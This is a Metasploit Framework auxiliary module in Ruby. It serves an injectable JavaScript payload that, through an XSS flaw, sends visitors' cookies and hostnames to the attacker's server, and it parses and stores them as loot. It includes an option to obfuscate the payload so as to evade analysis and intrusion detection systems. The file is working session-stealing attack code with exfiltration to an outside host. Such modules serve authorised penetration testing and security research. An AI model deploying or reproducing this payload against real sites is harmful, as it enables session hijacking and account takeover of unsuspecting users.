##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'			=> 'Capture: HTTP Logging Of Cookies',
			'Description'	=> %q{
					This module runs a webserver that serves a piece of javascript
					which will transmit cookies back to metasploit. In an attempt
					to evade analysis and Intrusion Detection Systems this module has
					an option to obfuscate the served javascript.
					To use this module the following javascript must be injected on a
					website vulnerable to XSS:
					<script src="http://metasploitserver:port/whatever.js"</script>
			},
			'License'	=> MSF_LICENSE,
			'Author'	=> ['Johnny Vestergaard <jkv@unixcluster.dk>', 'jkv']
	))

	register_options(
		[
			OptString.new('TARGET_COOKIE', [false, "Name of cookie to dump, leave empty to dump all cookies", ""]),
			OptBool.new('OBFUSCATE_JAVASCRIPT', [true, "Enables obfuscation of javascript code", true]),
		], self.class)
	end


	def run
		if datastore['URIPATH'] == nil
			datastore['URIPATH'] = Rex::Text.rand_text_alpha(rand(10) + 4)
		end

		exploit
	end

	#parse request and respond with 404
	def on_request_uri(cli, request)

		base_url = generate_base_url(cli, request)
		status_message = ""
		cookies = Array.new
		case request.uri
		when /\.js(\?|$)/
			content_type = "text/plain"
			send_response(cli, generate_js(base_url), {'Content-Type'=> content_type, })
		when /#{datastore['URIPATH']}\/{0,1}data\/(.*)/
			uri_s = request.uri.to_s.delete(' ')
			host_pos_start = datastore['URIPATH'].length + 7
			host = uri_s[host_pos_start .. uri_s.index('/', host_pos_start + 1) - 1]
			cookies = uri_s[host_pos_start + host.length + 1..-1].split(';')
			cookiesh = Hash.new()
			cookies.each do |item| 
				a,b = item.split('=')
				cookiesh[a] = b
			end
				
			if datastore['TARGET_COOKIE'] != ""
				cookiesh.delete_if {|k, v| k != datastore['TARGET_COOKIE']} 
			end
		data = "Host: #{host}, Client: #{cli.peerhost}, Cookies: #{cookiesh.map{|k,v| "#{k}=#{v}"}.join(';')}"
		print_status(data)
	
		loot_file = store_loot("document.cookies", "text/file", host, data, nil)	
		print_status("Stored in #{loot_file}") 
		
		#skip it - too  much noise!
		when /favicon\.ico/
		else
			print "Unexpected request: #{request.method} request for #{request.uri}"
		end
		
	#we know nothing!
	send_not_found(cli)
	end

	# Figure out what our base URL is based on the user submitted
	# Host header or the address of the client.
	# This def is shamelessly stolen from the http_javascript_keylogger - thanks Marcus! :-)
	def generate_base_url(cli, req)
		port = nil
		host = Rex::Socket.source_address(cli.peerhost)

		if req['Host']
			host = req['Host']
			bits = host.split(':')

			# Extract the hostname:port sequence from the Host header
			if bits.length > 1 and bits.last.to_i > 0
				port = bits.pop.to_i
				host = bits.join(':')
			end
		else
			port = datastore['SRVPORT'].to_i
		end

		prot = (!! datastore['SSL']) ? 'https://' : 'http://'
		if Rex::Socket.is_ipv6?(host)
			host = "[#{host}]"
		end

		base = prot + host
		if not ((prot == 'https' and port.nil?) or (prot == 'http' and port.nil?))
			base << ":#{port}"
		end

		base << get_resource
	end

	#Generation and obfuscation of javascript
	def generate_js(base_url)
		code = ::Rex::Exploitation::JSObfu.new %Q|
		new Image().src="#{base_url}/data/"+ window.location.hostname + "/" + document.cookie;|

		if datastore['OBFUSCATE_JAVASCRIPT']
			code.obfuscate
		end

		return code
	end

end
